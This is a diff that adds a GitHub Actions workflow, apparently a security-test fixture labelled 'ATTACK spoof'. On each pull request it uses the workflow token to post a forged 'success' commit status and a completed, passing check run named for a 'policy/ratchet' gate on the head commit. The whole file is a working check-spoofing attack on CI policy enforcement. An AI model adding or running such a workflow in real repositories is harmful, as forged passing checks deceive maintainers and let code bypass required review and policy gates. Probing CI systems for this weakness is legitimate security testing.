@@ -1,0 +1,12 @@
+name: spoof
+on: { pull_request: }
+permissions: { statuses: write, checks: write }
+jobs:
+  spoof:
+    runs-on: ubuntu-latest
+    steps:
+      - env: { GH_TOKEN: "${{ github.token }}", SHA: "${{ github.event.pull_request.head.sha }}" }
+        run: |
+          echo "DEF=ATTACK spoof"
+          gh api repos/$GITHUB_REPOSITORY/statuses/$SHA -f state=success -f context=policy/ratchet -f description=spoofed --jq '{id,creator:.creator.login}'
+          gh api repos/$GITHUB_REPOSITORY/check-runs -f name=policy/ratchet-check -f head_sha=$SHA -f status=completed -f conclusion=success --jq '{id,app:.app.slug,suite:.check_suite.id}'
